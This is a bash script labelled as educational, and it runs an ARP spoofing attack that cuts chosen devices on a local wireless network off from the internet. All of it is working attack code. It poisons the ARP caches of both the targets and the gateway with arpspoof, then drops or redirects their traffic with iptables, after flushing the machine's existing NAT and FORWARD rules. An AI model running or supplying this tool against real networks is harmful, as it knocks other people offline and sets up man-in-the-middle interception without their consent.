#!/bin/bash

# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Requires: arpspoof, iptables, and root privileges

# Check if script is running as root
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root" 
    echo "Please re-run using: sudo $0 $*"
    exit 1
fi

# Detect Current Network Configuration 
WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
MASK=$(ip addr show "$WLAN" | grep 'inet ' | awk '{print $2}')
IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
echo ""
echo "Current Network Configuration"
echo ""
echo "INTERFACE: | $WLAN"
echo "GATEWAY:   | $GW"
echo "DEVICE IP: | $IP"
echo "TARGETS:   | $MASK"
echo ""

# Detect Interface
echo "Enter Wireless Interface: Enter for default"
read -p "> $WLAN " WLN
INTERFACE="${WLN:-$WLAN}"
echo ""

# Detect Gateway IP
echo "Enter Router Gateway IP: Enter for default"
read -p "> $GW " INET
GATEWAY="${INET:-$GW}"
echo ""

# Detect Subnet
echo "Enter Multiple Target IP's: e.g 10.0.0.123,10.0.0.124"
read -p "> " IPS
TARGET_IPS="${IPS:-$MASK}"
echo ""

# Detect Device IP
echo "Enter Device IP: Enter for default"
read -p "> $IP " DEVIP
MYIP="${DEVIP:-$IP}"
echo ""

# Prompt configuration
echo "Your Arpspoof Configurations..."
echo ""
echo "INTERFACE: | $INTERFACE"
echo "GATEWAY:   | $GATEWAY"
echo "DEVICE IP: | $MYIP"
echo "TARGETS:   | $TARGET_IPS"
echo ""

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush Iptables existing rules
iptables -t nat -F
iptables -F FORWARD

# Remove Iptables rules
cat > /bin/netkiller-stop << EOF
#!/bin/sh

iptables -t nat -F
iptables -F FORWARD
pkill arpspoof
echo "Restoring the Connections..."
EOF
chmod 755 /bin/netkiller-stop

for TARGET in $TARGET_IPS; do
       # Block all traffic of the target wifi clients
    (
        iptables -I FORWARD -s "$TARGET" -d "$GATEWAY" -j DROP
        iptables -I FORWARD -d "$GATEWAY" -s "$TARGET"  -j DROP
        iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
      
      # Bidirectional Arp Spoofing
        arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
        arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
    ) &
done

echo " "
echo "Attacks is running in the background...!!!"
echo "To stop, Run: sudo netkiller-stop"
echo " "
